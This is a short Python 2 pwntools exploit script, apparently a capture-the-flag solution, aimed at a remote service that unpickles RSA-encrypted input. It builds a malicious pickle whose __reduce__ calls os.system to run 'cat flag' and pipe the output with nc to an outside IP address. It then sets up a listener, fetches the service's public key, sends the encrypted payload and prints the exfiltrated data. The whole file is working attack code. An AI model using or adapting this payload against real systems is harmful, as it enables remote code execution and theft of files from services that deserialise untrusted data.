import os
import pickle
import rsa
import re
from pwn import *


class Exploit(object):
    def __reduce__(self):
        comm = "(cat flag) | (nc 140.114.195.92 1234)"
        return (os.system, (comm,))


def main():
    l = listen(port=1234)
    s = remote('140.113.194.85', 49167)
    s.sendline('6')
    key = s.recvline()
    key = re.findall("(\d*, \d*)", key)
    if key != []:
        key = key[0].split(',')
        print key
        c = l.wait_for_connection()
        s.sendline(rsa.encrypt(pickle.dumps(Exploit()), rsa.PublicKey(int(key[0]), int(key[1]))).encode('base64'))
        print c.recv()


if __name__ == '__main__':
    main()
